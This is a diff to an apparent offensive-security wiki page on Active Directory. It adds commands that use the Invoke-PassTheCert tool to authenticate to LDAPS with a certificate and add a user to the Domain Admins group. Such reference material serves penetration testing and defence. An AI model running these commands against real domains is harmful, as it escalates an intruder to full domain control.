@@ -1,5 +1,5 @@
 ---
-authors: CravateRouge, ShutdownRepo, sckdev, 0xblank
+authors: CravateRouge, ShutdownRepo, sckdev, 0xblank, jamarir
 category: ad
 ---
 
@@ -54,6 +54,22 @@ Add-ADGroupMember -Identity 'Domain Admins' -Members 'user'
 
 # Powershell: PowerSploit module
 Add-DomainGroupMember -Identity 'Domain Admins' -Members 'user'
+```
+
+The [Invoke-PassTheCert](https://github.com/jamarir/Invoke-PassTheCert) fork can also be used, authenticating through Schannel via [PassTheCert](https://www.thehacker.recipes/ad/movement/schannel/passthecert) (PowerShell version).
+
+> Note: the README contains the methodology to request a certificate using [certreq](https://github.com/GhostPack/Certify/issues/13#issuecomment-3622538862) from Windows (with a password, or an NTHash).
+```powershell
+# Import the PowerShell script and show its manual
+Import-Module .\Invoke-PassTheCert.ps1
+.\Invoke-PassTheCert.ps1 -?
+# Authenticate to LDAP/S
+$LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server 'LDAP_IP' -Port 636 -Certificate cert.pfx
+# List all the available actions
+Invoke-PassTheCert -a -NoBanner
+
+# Adds the member 'Kinda KU. USY' into the group 'Domain Admins'
+Invoke-PassTheCert -Action 'AddGroupMember' -LdapConnection $LdapConnection -Identity 'CN=Kinda KU. USY,CN=Users,DC=X' -GroupDN 'CN=Domain Admins,CN=Users,DC=X'
 ```
 
 :::
